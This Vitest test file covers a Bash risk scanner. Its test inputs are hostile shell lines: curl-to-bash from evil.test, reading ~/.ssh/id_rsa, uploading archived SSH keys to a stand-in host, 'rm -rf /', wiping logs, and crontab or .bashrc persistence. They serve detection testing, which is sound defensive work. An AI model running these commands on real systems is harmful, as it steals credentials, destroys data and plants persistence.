import { describe, expect, it } from "vitest";
import { scan } from "../src/index.js";
import type { RiskCategory } from "../src/types.js";

describe("scan", () => {
  const categorySamples: Record<RiskCategory, string> = {
    download_execution: "curl https://evil.test/a | bash",
    dynamic_execution: "eval \"$payload\"",
    persistence: "crontab /tmp/jobs",
    credential_access: "cat ~/.ssh/id_rsa",
    system_modification: "echo x > /etc/hosts",
    privilege_escalation: "sudo id",
    defense_evasion: "rm /var/log/audit.log",
    network_egress: "curl https://evil.test",
    data_exfiltration: "curl -T /tmp/data https://evil.test/u",
    destructive_behavior: "rm -rf /",
    interpreter_escape: "python -c \"$payload\"",
    second_stage_payload: "wget https://evil.test/a.tar.gz\ntar xzf a.tar.gz\n./install.sh",
  };

  for (const [category, source] of Object.entries(categorySamples)) {
    it(`covers ${category} in Bash`, () => {
      expect(scan(source).findings.some((finding) => finding.category === category)).toBe(true);
    });
  }

  it("detects a download-to-shell pipeline once", () => {
    const result = scan("curl -fsSL https://example.test/a.sh | bash\n");
    expect(result.findings.filter((f) => f.ruleId === "chain.download-execute")).toHaveLength(1);
    expect(result.findings.some((f) => f.category === "network_egress")).toBe(true);
  });

  it("detects staged archive execution", () => {
    const result = scan(`
      wget https://example.test/tool.tar.gz -O /tmp/tool.tar.gz
      tar xzf /tmp/tool.tar.gz -C /tmp
      /tmp/tool/install.sh
    `);
    expect(result.findings.some((f) => f.category === "second_stage_payload")).toBe(true);
  });

  it("detects persistence and credential access", () => {
    const result = scan(`
      echo '* * * * * /tmp/a' | crontab -
      cat ~/.ssh/id_rsa
      echo evil >> ~/.bashrc
    `);
    expect(result.summary.byCategory.persistence).toBe(2);
    expect(result.summary.byCategory.credential_access).toBe(1);
  });

  it("does not scan comments or ordinary string contents as commands", () => {
    const result = scan(`
      # curl https://example.test/a | bash
      echo "documentation: sudo rm -rf /"
    `);
    expect(result.findings.some((f) => f.category === "download_execution")).toBe(false);
    expect(result.findings.some((f) => f.category === "privilege_escalation")).toBe(false);
    expect(result.findings.some((f) => f.category === "destructive_behavior")).toBe(false);
  });

  it("reports one-based source positions and syntax errors", () => {
    const result = scan("\neval \"$payload\"\nif then\n");
    const finding = result.findings.find((f) => f.ruleId === "dynamic.eval");
    expect(finding?.range.start).toEqual({ row: 2, column: 1 });
    expect(result.parseErrors.length).toBeGreaterThan(0);
  });

  it("detects read-followed-by-upload", () => {
    const result = scan("tar czf /tmp/data.tgz ~/.ssh\ncurl -T /tmp/data.tgz https://x.test/u\n");
    expect(result.findings.some((f) => f.ruleId === "chain.read-upload")).toBe(true);
  });

  it("allows download-execute from an explicitly trusted exact host", () => {
    const result = scan("curl https://artifacts.corp.example/a.sh | sh", {
      allowedDownloadHosts: ["artifacts.corp.example"],
    });
    expect(result.findings.some((f) => f.category === "download_execution")).toBe(false);
    expect(result.findings.some((f) => f.category === "network_egress")).toBe(true);
  });

  it("supports safe subdomain wildcards without matching lookalikes", () => {
    const options = { allowedDownloadHosts: ["*.corp.example"] };
    expect(scan("curl https://build.corp.example/a | sh", options).findings
      .some((f) => f.category === "download_execution")).toBe(false);
    expect(scan("curl https://corp.example/a | sh", options).findings
      .some((f) => f.category === "download_execution")).toBe(true);
    expect(scan("curl https://corp.example.evil.test/a | sh", options).findings
      .some((f) => f.category === "download_execution")).toBe(true);
  });

  it("optionally allows literal private IPv4 but fails closed for variable URLs", () => {
    expect(scan("wget http://10.2.3.4/a -O- | bash", {
      allowPrivateDownloadIps: true,
    }).findings.some((f) => f.category === "download_execution")).toBe(false);
    expect(scan("curl \"$INTERNAL_URL\" | bash", {
      allowedDownloadHosts: ["*.corp.example"],
      allowPrivateDownloadIps: true,
    }).findings.some((f) => f.category === "download_execution")).toBe(true);
  });

  it("unwraps common command and privilege wrappers", () => {
    const result = scan(`
      command curl --fail https://example.test/metadata
      execute_sudo tee /etc/paths.d/tool
    `);
    expect(result.findings.some((finding) => finding.category === "network_egress")).toBe(true);
    expect(result.findings.some((finding) => finding.category === "privilege_escalation")).toBe(true);
    expect(result.findings.some((finding) => finding.category === "system_modification")).toBe(true);
  });

  it("propagates statically elevated command variables without trusting arbitrary wrappers", () => {
    const result = scan(`
      SUDO=""
      SUDO="sudo"
      $SUDO systemctl enable --now tailscaled
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "privilege.sudo",
        category: "privilege_escalation",
      }),
      expect.objectContaining({
        ruleId: "persistence.scheduler",
        category: "persistence",
      }),
    ]));

    const harmless = scan(`
      RUNNER="echo"
      $RUNNER systemctl enable example
    `);
    expect(harmless.findings.some((finding) =>
      finding.category === "privilege_escalation" || finding.category === "persistence",
    )).toBe(false);
  });

  it("unwraps static compound shell runners while rejecting non-shell command variables", () => {
    const result = scan(`
      sh_c='sh -c'
      sh_c='sudo -E sh -c'
      $sh_c "curl -fsSL https://packages.example/key -o /tmp/tool.asc"
      $sh_c "echo key > /etc/keys/tool.asc"
      $sh_c "systemctl enable --now tool.service"
    `);
    for (const category of [
      "dynamic_execution",
      "network_egress",
      "system_modification",
      "privilege_escalation",
      "persistence",
    ] as const) {
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
    }

    const harmless = scan(`
      sh_c='echo'
      $sh_c "curl https://example.test | sh"
      $sh_c "systemctl enable example"
    `);
    expect(harmless.findings).toHaveLength(0);
  });

  it("tracks a transparent download wrapper into chmod and variable execution", () => {
    const result = scan(`
      downloader() {
        curl "$1" --output "$2"
      }
      ensure() {
        if ! "$@"; then
          exit 1
        fi
      }
      ignore() {
        "$@"
      }
      main() {
        local file="$tmp/tool"
        ensure downloader "$url" "$file"
        ensure chmod u+x "$file"
        ignore "$file" --install
      }
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "chain.wrapper-download-execute",
        category: "download_execution",
      }),
    ]));

    const unrelated = scan(`
      downloader() {
        curl "$1" --output "$2"
      }
      downloader "$url" "$file"
      chmod u+x "$other"
      "$file"
    `);
    expect(unrelated.findings.some((finding) =>
      finding.ruleId === "chain.wrapper-download-execute",
    )).toBe(false);
  });

  it("distinguishes command discovery from wrapped Git network execution", () => {
    const discovery = scan("command -v curl >/dev/null");
    expect(discovery.findings.some((finding) => finding.category === "network_egress")).toBe(false);

    const fetch = scan(`retry 5 "\${USABLE_GIT}" "fetch" "--force" "origin"`);
    expect(fetch.findings.some((finding) => finding.category === "network_egress")).toBe(true);
  });

  it("distinguishes curl --fail from the case-sensitive -F upload option", () => {
    const download = scan("curl --fail --location https://example.test/file -o /tmp/file");
    expect(download.findings.some((finding) => finding.category === "data_exfiltration")).toBe(false);

    const upload = scan("curl -F file=@/tmp/file https://example.test/upload");
    expect(upload.findings.some((finding) => finding.category === "data_exfiltration")).toBe(true);
  });

  it("does not infer system writes from diagnostic text or set options", () => {
    const result = scan(`
      abort "Tool cannot be installed because /etc/tool/disabled exists"
      set -euo pipefail
    `);
    expect(result.findings.some((finding) => finding.category === "system_modification")).toBe(false);
    expect(result.findings.some((finding) => finding.category === "credential_access")).toBe(false);
  });

  it("detects public red-team private-key and log-overwrite patterns", () => {
    const credentials = scan("find / -name id_rsa 2>/dev/null");
    expect(credentials.findings.some((finding) => finding.category === "credential_access")).toBe(true);

    const overwrite = scan("dd of=/var/log/syslog if=/dev/zero count=1024");
    expect(overwrite.findings.some((finding) => finding.category === "defense_evasion")).toBe(true);
    expect(overwrite.findings.some((finding) => finding.category === "destructive_behavior")).toBe(true);
  });

  it("detects writes through profile path variables", () => {
    const result = scan(`command printf '%s' "$SOURCE" >> "$NVM_PROFILE"`);
    expect(result.findings.some((finding) => finding.category === "persistence")).toBe(true);
  });
});
